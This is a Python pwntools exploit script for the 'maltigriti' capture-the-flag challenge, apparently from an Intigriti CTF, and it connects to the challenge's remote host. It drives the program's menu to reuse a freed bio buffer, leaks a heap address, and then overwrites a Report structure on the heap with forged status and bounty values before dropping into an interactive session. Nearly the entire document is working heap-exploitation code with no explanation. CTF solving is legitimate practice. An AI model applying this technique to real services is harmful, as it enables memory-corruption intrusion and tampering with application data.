from pwn import *

global p
elf = ELF('./maltigriti', checksec=False)
libc = ELF('./libc.so.6', checksec=False)



def register(name, password, len_bio, bio):
    p.recvuntil(b"menu> ")
    p.sendline(b"0")
    p.recvuntil(b"Enter your name> ")
    p.sendline(name)
    p.recvuntil(b"Enter your password> ")
    p.sendline(password)
    p.recvuntil(b"How long is your bio> ")
    p.sendline(len_bio)
    p.recvuntil(b"Enter your new bio> ")
    p.sendline(bio)
    

def edit(len_bio=0, bio=b""):
    p.recvuntil(b"menu> ")
    p.sendline(b"1")
    choice = p.recvuntil(b" ", drop=True)
    if choice == b"You":
        p.recvuntil(b"How long is your bio> ")
        p.sendline(len_bio)
        p.recvuntil(b"Enter your new bio> ")
        p.sendline(bio)
    else:
        p.recvuntil(b"current bio is: ")
        leak = p.recvline().strip()
        p.recvuntil(b"Enter your new bio> ")
        p.sendline(bio)
        return leak

def bug_report(title, content):
    p.recvuntil(b"menu> ")
    p.sendline(b"2")
    p.recvuntil(b"Enter your report title> ")
    p.sendline(title)
    p.recvuntil(b"Please enter the content of your report> ")
    p.sendline(content)

def logout():
    p.recvuntil(b"menu> ")
    p.sendline(b"6")

def balance():
    p.recvuntil(b"menu> ")
    p.sendline(b"4")
    p.recvuntil(b"Your balance is: ")
    return p.recvline().strip()

#p = process(elf.path)
p = remote("maltigriti.ctf.intigriti.io",1337)

bug_report(b"miaou", b"salut")

pause()

register(b"miaou", b"quoicoubaka", str(0xc0).encode(), b"A"*0xbf)
logout()


bug_report(b"baka", b"baka")
heap = u64(edit(str(10).encode(), b"\x00"*10).ljust(8, b"\x00"))

info("heap @ 0x%hx" % heap)

"""
struct Report {
    struct User *user;
    char status;
    long bounty;
    char title[32];
    char body[128];
    struct Report *next;
};
"""



payload = b"A"*8 # user
payload += p64(0x41) # Status
payload += p64(0x1333333337) # Bounty
payload += b"bonjour".ljust(32, b"\x00") # title
payload += b"tu fais quoi".ljust(128,b"\x00") # body
payload += p64(0x0)


edit(0xc0, payload)

payload2 = p64(heap)
payload2 += p64(0x41)
payload2 += b"A"*7

edit(0xc0, payload2)

p.interactive()